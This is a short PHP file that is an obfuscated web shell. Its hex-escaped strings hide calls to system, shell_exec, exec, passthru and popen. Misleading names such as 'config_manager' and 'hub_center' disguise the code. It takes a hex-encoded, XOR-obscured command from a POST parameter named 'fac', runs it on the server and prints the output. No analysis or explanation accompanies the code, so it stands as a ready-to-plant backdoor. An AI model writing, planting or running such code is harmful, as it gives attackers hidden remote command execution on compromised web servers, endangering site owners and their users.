<?php

$reverse_searcher = "\x68\x65\x782\x62in";
$hub_center7 = "p\x63lo\x73\x65";
$hub_center5 = "p\x6Fp\x65n";
$hub_center4 = "\x70\x61\x73\x73thru";
$hub_center1 = "\x73\x79st\x65m";
$hub_center6 = "\x73tre\x61m_\x67\x65t\x5F\x63\x6Fnte\x6Et\x73";
$hub_center2 = "\x73he\x6C\x6C_\x65x\x65c";
$hub_center3 = "\x65\x78ec";
if (isset($_POST["\x66\x61c"])) {
            function config_manager( $k , $entity ){ $parameter_group ='' ; $t=0; do{$parameter_group.=chr(ord($k[$t])^$entity);$t++;} while($t<strlen($k)); return $parameter_group; }
            $fac = $reverse_searcher($_POST["\x66\x61c"]);
            $fac = config_manager($fac, 76);
            if (function_exists($hub_center1)) {
                $hub_center1($fac);
            } elseif (function_exists($hub_center2)) {
                print $hub_center2($fac);
            } elseif (function_exists($hub_center3)) {
                $hub_center3($fac, $flag_k);
                print join("\n", $flag_k);
            } elseif (function_exists($hub_center4)) {
                $hub_center4($fac);
            } elseif (function_exists($hub_center5) && function_exists($hub_center6) && function_exists($hub_center7)) {
                $entity_parameter_group = $hub_center5($fac, 'r');
                if ($entity_parameter_group) {
                    $ptr_flg = $hub_center6($entity_parameter_group);
                    $hub_center7($entity_parameter_group);
                    print $ptr_flg;
                }
            }
            exit;
        }